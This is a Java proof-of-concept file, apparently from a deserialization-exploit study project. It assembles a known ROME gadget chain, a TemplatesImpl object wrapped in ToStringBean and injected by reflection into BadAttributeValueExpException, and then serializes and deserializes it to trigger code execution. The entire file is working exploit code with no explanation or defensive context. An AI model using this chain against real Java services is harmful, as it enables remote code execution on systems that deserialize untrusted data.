package com.example.Rome;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import com.example.Utils.Share;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.ToStringBean;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;

public class POC_1 {

    public static void main(String[] args) throws Exception {
        TemplatesImpl tmpl = Share.getTemplatesImplObj();

        ToStringBean stringBean = new ToStringBean(Templates.class, tmpl);
        BadAttributeValueExpException bad = new BadAttributeValueExpException("1");
        ReflectionUtil.setField(bad, "val", stringBean);

        SerializeUtil.deserialize(SerializeUtil.serialize(bad));
    }

}
